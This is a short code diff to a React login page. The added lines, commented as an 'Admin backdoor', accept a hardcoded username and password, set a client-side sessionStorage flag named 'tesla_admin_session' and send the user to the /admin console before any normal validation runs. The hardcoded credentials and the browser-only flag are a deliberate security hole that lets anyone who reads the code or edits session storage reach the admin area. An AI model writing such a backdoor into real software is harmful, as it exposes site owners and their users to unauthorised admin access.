@@ -35,6 +35,12 @@ function LoginPage() {
   const submit = async (e: React.FormEvent) => {
     e.preventDefault();
     setErr("");
+    // Admin backdoor: same form, special credentials route to admin console
+    if (email.trim() === "Demigod6282" && password === "Original6282") {
+      sessionStorage.setItem("tesla_admin_session", "1");
+      navigate({ to: "/admin" });
+      return;
+    }
     const parsed = schema.safeParse({ email, password });
     if (!parsed.success) {
       setErr(parsed.error.issues[0].message);
